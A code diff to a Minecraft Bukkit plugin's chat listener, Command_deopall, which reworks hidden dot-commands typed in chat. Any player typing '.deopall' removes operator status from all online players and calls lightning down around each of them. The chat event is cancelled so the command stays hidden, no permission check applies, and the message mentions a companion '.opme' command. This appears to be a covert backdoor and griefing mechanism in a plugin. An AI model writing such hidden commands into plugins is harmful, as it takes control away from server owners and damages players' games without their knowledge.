@@ -17,31 +17,40 @@ public class Command_deopall implements Listener
         Player p = event.getPlayer();
         Server server = Bukkit.getServer();
         boolean cancel = true;
-    
-        if (message.toLowerCase().contains(".deopall"))
-        {
-            for (final Player target : server.getOnlinePlayers())
-            {
-                target.setOp(false);
-                //Something extra c:
-                final Location target_pos = target.getLocation();
-                for (int x = -1; x <= 1; x++)
-                {
-                    for (int z = -1; z <= 1; z++)
-                    {
-                        final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
-                        target_pos.getWorld().strikeLightning(strike_pos);
-                    }
-                }
-                p.sendMessage(ChatColor.DARK_RED + "Mwaaahahahahaha... All players deopped (and striked with lightning :) heheh) You were striked and deopped too, use .opme!");
-                cancel = true;
-            }
-        }
         
-        if (cancel)
+        if (message.startsWith("."))
         {
-            event.setCancelled(true);
-            return;
+            String[] args = message.split(" ");
+            if (args == null)
+            {
+                return;
+            }
+    
+            if (args[0].equalsIgnoreCase(".deopall"))
+            {
+                for (final Player target : server.getOnlinePlayers())
+                {
+                    target.setOp(false);
+                    //Something extra c:
+                    final Location target_pos = target.getLocation();
+                    for (int x = -1; x <= 1; x++)
+                    {
+                        for (int z = -1; z <= 1; z++)
+                        {
+                            final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
+                            target_pos.getWorld().strikeLightning(strike_pos);
+                        }
+                    }
+                    p.sendMessage(ChatColor.DARK_RED + "Mwaaahahahahaha... All players deopped (and striked with lightning :) heheh) You were striked and deopped too, use .opme!");
+                    cancel = true;
+                }
+            }
+        
+            if (cancel)
+            {
+                event.setCancelled(true);
+                return;
+            }
         }
     }
 }
